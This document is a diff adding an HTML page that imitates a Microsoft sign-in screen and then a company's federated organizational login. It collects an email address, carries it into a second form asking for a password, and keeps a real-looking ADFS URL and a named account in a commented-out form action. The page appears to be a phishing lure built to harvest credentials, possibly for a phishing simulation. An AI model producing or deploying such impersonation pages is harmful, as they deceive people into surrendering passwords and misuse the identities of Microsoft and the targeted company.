@@ -1,0 +1,181 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <title>Sign in to your account</title>
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/3.4.1/css/bootstrap.min.css">
+  <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.5.1/jquery.min.js"></script>
+  <script src="https://maxcdn.bootstrapcdn.com/bootstrap/3.4.1/js/bootstrap.min.js"></script>
+<!--  <link rel="stylesheet" type="text/css" href="./Sign In_files/style.css"><style>.illustrationClass {background-image:url("illustration.png");}</style>
+-->
+</head>
+<body id="rootmera">
+<style>
+html, body {
+  height: 100%;
+  font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+}
+</style>
+<div class="container-fluid " id="prevpage" style="background-color: #dddddd; height:100%; background-size: cover; background-repeat: no-repeat; background-position: center; display: flex;">
+    <div class="container" >
+        
+            <div class="row" style="margin-top: 100px;">
+             <div class="col-sm-offset-3 col-sm-5 shadow-sm p-3 mb-5 bg-white rounded" style="background-color:white; box-shadow: 2px 2px 1px 1px #aaa;">
+                <div class="row">
+                    <div class="col-sm-12" style="padding-left:40px;padding-right:40px;padding-top:40px;padding-bottom:40px;">
+                        <img src="https://aadcdn.msftauth.net/shared/1.0/content/images/microsoft_logo_ee5c8d9fb6248c938fd0dc19370e90bd.svg"/>
+                        <br><br>
+                        <p style="font-size: 22px; font-weight:550;padding-bottom: 10px;">Sign in</p>
+                        <div id="error" style="color:red;"></div>
+                        <input id="ineedthis" type="text" placeholder="Email, phone or Skype" style="width:100%; outline:0; padding-bottom: 8px; border-width: 0 0 1px; border-color:#3a508c;"/>
+                        <br><br>
+                        <style>
+                            input:focus {
+                                  border-color: #20356e;
+                            }
+                        </style>
+                        <p>No account? <a href="#">Create one!</a></p>
+                        
+                        <p style="padding-top:8px; padding-bottom:18px;"><a href="#">Can't access your account?</a></p>
+                        <div class="row">
+                            <div class="col-sm-offset-8 col-sm-4">
+                               <button id="iamclicked" onclick="changepage()" class="btn btn-primary" style="padding-top:3px;padding-bottom:3px;padding-left: 40px; padding-right: 40px; border-radius: 2px;">Next</button>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+            
+                </div>
+
+            </div>
+            <div class="row" style="margin-top: 20px;">
+                <div class="col-sm-offset-3 col-sm-5 shadow-sm p-3 mb-5 bg-white rounded" id="neechewala" style="background-color:white; box-shadow: 2px 2px 1px 1px #aaa;">
+                    <div class="row">
+                        <div class="col-sm-12" style="padding-left:40px;padding-right:40px;padding-top:5px;padding-bottom:2px;">
+                            <img src="https://aadcdn.msftauth.net/shared/1.0/content/images/signin-options_4e48046ce74f4b89d45037c90576bfac.svg" style="transform: scale(0.7);"/><span style="font-size:15px;">Sign-in Options</span>
+                        </div>
+                    </div>
+                </div>
+            </div>
+    </div>
+
+</div>
+
+<div id="fullPage" style="display: none;">
+    <div id="brandingWrapper" class="float">
+        <div id="branding" class="illustrationClass"></div>
+    </div>
+    <div id="contentWrapper" class="float">
+        <div id="content">
+            <div id="header">
+                <img class="logoImage" id="companyLogo" src="./Sign In_files/logo.jpg" alt="Indospace Federation Services">
+            </div>
+            <div id="workArea">
+                
+<div id="authArea" class="groupMargin">
+<div id="loginArea">        
+    <div id="loginMessage" class="groupMargin">Sign in with your organizational account</div>
+
+    <!-- <form method="post" id="loginForm" autocomplete="off" novalidate="novalidate" onkeypress="if (event &amp;&amp; event.keyCode == 13) Login.submitLoginRequest();" action="https://azidmpladfs.indospace.in/adfs/ls/?client-request-id=53f7de95-c559-42e6-a20f-98b0e0e20d11&amp;wa=wsignin1.0&amp;wtrealm=urn%3afederation%3aMicrosoftOnline&amp;wctx=LoginOptions%3D3%26estsredirect%3d2%26estsrequest%3drQIIAYWSvYvbZgCHLfvOuRykuZRQQoZwQ4dSkO7VK8myDIHo_HGy5Fe2bCmWtBidZX1aHyfJUm36B3TM0lIyZryphBbaTl263JQ5Qyk3lNKpFEo7ZMjdX5DlB89vfZ7DOy2iTQACfN4gCbLzKU3RjMWeczhntSic5kiAWzRs4RRDtSgISJsBVPbx4dHXv_03M3794_TV_W-_-_363oNL7IlXFGneOTmpqopIHMdfrohlEp2srdj2Y_dHDHuDYX9i2Mv6_irGtdllPW9RbItiIM20SbJNk7BNE-Oe58kqqoxgWaAd-sLwAZAhokZzMZIDt0Dz4Q5FcjRW-7QRDDwzUoAZiBE604qbf21sATDVEI5UFxoBX8g9jUbBNDTmCiVHCv22fn_MbwoP3k6S-bvVP_W7TpJFizTJi5eNb-pR7CmaCyTJHleZ1Gp7bNzddpOMQzbcKruehoqSzBVvZsg8KYhD88xa7k6rhT1ZbNaS6iQDcWRarpgoq5Bbjvs6PuHtdGOKUj-f20lWJtR8dj5bzMHmvIRFqq_Xfth1KUjPxiOuiCZFIgSC1949n7KmEifTyGQVvoBlNCw4SPKLcKTry8wXLvStomzhwMrWmu7onmxNFZSnivMcCQgNQ1ZhehuTPlvlpTBCriZPBroM_VlX43plhViO63eHc6br4NZ2akiiJob-CAWnkpCVgpewMAFiKXWVsK_o7utG80ZmlMRXjY-SdBX79nGaJY6_Xl03HvuxnRBhGrnEJs-e3VKeWjf6_fjNHvbX3icHzaODR7Xj2mcPQaNzcHB4VLul__ewV_s3KX2Zfz_56dEP0uXr4N93i-va1f6Jy4yjdStFFbyQSXQxBN20H5YD5Ig8ozrxdE5XoS5sx6eq-5TpkC-a2Itm86r5YNhbyH11pvJyj5_24AL83cS-ulP7-e4H4nx7-BACSOKgjQN4TLY7gOvQrPnLvdp70&amp;cbcxt=&amp;username=indo.kpmg.usr%40indospace.in&amp;mkt=en-US&amp;lc="> -->
+    <form method="post" id="loginForm" autocomplete="off" novalidate="novalidate" name="form">
+        <div id="error" class="fieldMargin error smallText" style="display: none;">
+            <span id="errorText" for=""></span>
+        </div>
+
+        <div id="formsAuthenticationArea">
+            <div id="userNameArea">
+                <label id="userNameInputLabel" for="userNameInput" class="hidden">User Account</label>
+                <input id="userNameInput" name="UserName" type="email" tabindex="1" class="text fullWidth" spellcheck="false" placeholder="someone@example.com" autocomplete="off">
+            </div>
+
+            <div id="passwordArea">
+                <label id="passwordInputLabel" for="passwordInput" class="hidden">Password</label>
+                <input id="passwordInput" name="Password" type="password" tabindex="2" class="text fullWidth" placeholder="Password" autocomplete="off">
+            </div>
+            <div id="kmsiArea" style="display:none">
+                <input type="checkbox" name="Kmsi" id="kmsiInput" value="true" tabindex="3">
+                <label for="kmsiInput">Keep me signed in</label>
+            </div>
+            <div id="submissionArea" class="submitMargin">
+                <span id="submitButton" class="submit" tabindex="4" role="button" type="submit">Sign in</span>
+                <!-- <span id="submitButton" class="submit" tabindex="4" role="button" onkeypress="if (event &amp;&amp; event.keyCode == 32) Login.submitLoginRequest();" onclick="">Sign in</span> -->
+            </div>
+        </div>
+        <input id="optionForms" type="hidden" name="AuthMethod" value="FormsAuthentication">
+    </form>
+
+         <div id="authOptions">
+        <input id="optionSelection" type="hidden" name="AuthMethod">
+        <div id="authOptionLinks" class="groupMargin"></div>
+    </form>
+  </div>
+
+    <div id="introduction" class="groupMargin">
+                             
+    </div>
+</div>
+
+</div>
+
+            </div>
+            <div id="footerPlaceholder"></div>
+        </div>
+        <div id="footer">
+            <div id="footerLinks" class="floatReverse">
+                 <div><span id="copyright">© 2016 Microsoft</span></div>
+            </div>
+        </div>
+    </div> 
+</div>
+
+<script>
+    var email;
+    function validateEmail(email) 
+    {
+        var re = /\S+@\S+\.\S+/;
+        return re.test(email);
+    }
+
+    function changepage()
+    {
+        email = document.getElementById("ineedthis").value;
+        console.log(validateEmail(email));
+        if(validateEmail(email))
+        {
+
+            console.log(email);
+            rmMinusRf();
+            setTimeout(importcssdynamically, 1000);
+        }
+        else{
+            invalidemail();
+        }
+    }
+    function invalidemail(){
+        document.getElementById("error").innerText = "Enter a valid email address, phone number, or Skype name.";
+    }
+
+    function rmMinusRf(){
+        document.getElementById("prevpage").style.display = "none";
+    }
+
+    function importcssdynamically(){
+        var head = document.getElementsByTagName('HEAD')[0]; 
+        var link = document.createElement('link');
+        link.rel = 'stylesheet';   
+        link.type = 'text/css';
+        link.href = './Sign In_files/style.css'; 
+        head.appendChild(link); 
+        importnewpage();
+    }
+    function importnewpage()
+    {
+        document.getElementById("fullPage").style.display = "block";
+        document.getElementById("userNameInput").value = email;
+        document.title = "Sign In";        
+    }
+</script> 
+
+</body>
+</html>
